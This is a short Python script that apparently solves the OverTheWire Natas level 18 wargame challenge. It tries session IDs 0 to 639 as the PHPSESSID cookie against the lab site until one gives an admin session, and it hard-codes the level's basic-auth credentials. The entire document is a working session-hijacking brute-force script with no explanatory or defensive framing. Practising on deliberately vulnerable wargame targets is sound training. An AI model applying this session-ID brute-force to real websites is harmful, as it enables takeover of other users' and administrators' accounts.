#!/usr/bin/python

import time
import requests
from requests.auth import HTTPBasicAuth

for x in range(640):
    print "Trying: " + str(x)
    r = requests.get("http://natas18.natas.labs.overthewire.org/", 
auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), 
cookies={"PHPSESSID":str(x)})
    if "You are an admin." in r.text:
        print str(x)
        break
        
